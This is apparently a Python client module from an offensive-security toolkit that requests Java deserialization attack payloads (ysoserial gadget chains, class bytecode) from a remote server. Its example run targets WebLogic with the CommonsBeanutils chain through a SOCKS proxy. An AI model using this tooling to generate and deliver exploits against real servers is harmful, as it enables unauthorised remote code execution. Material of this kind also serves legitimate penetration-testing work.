import base64
from dataclasses import dataclass
from typing import Optional

from .constants import ServerType, PayloadFormat, YsoserialType
from .server import build_session, ServerBase


@dataclass
class PayloadOptions:
    server: ServerType
    format: PayloadFormat
    ysoserial: Optional[YsoserialType] = None
    classname: Optional[str] = None


@dataclass
class PayloadInfo:
    options: PayloadOptions
    payload: bytes


class RemotePayloadGenerator(ServerBase):
    def __init__(self, proxy: str = None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.client = build_session(proxy=proxy)

    def get_payload(self, options: PayloadOptions) -> PayloadInfo:
        uri = self.get_server_url("/payload")
        params = {
            "format": options.format,
            "server": options.server,
        }
        if options.ysoserial:
            params["ysoserial"] = options.ysoserial
        if options.format == PayloadFormat.CLASS_BYTECODE:
            params["classname"] = options.classname
        resp = self.client.get(uri, params=params)
        if resp.status_code != 200:
            raise Exception(f"Response code is not 200: {resp.status_code}, {resp.text}")
        result = resp.json()
        return PayloadInfo(options=options, payload=base64.b64decode(result["payload"]))

    def close(self):
        self.client.close()


if __name__ == "__main__":
    generator = RemotePayloadGenerator(proxy="socks5://127.0.0.1:9999")
    opt = PayloadOptions(
        server=ServerType.WEBLOGIC,
        format=PayloadFormat.CLASS_BYTECODE,
        ysoserial=YsoserialType.COMMONS_BEANUTILS_1_6,
    )
    payload = generator.get_payload(opt)
    print(payload)
    print(payload.options)
    print(payload.options.server)
    print(payload.payload)
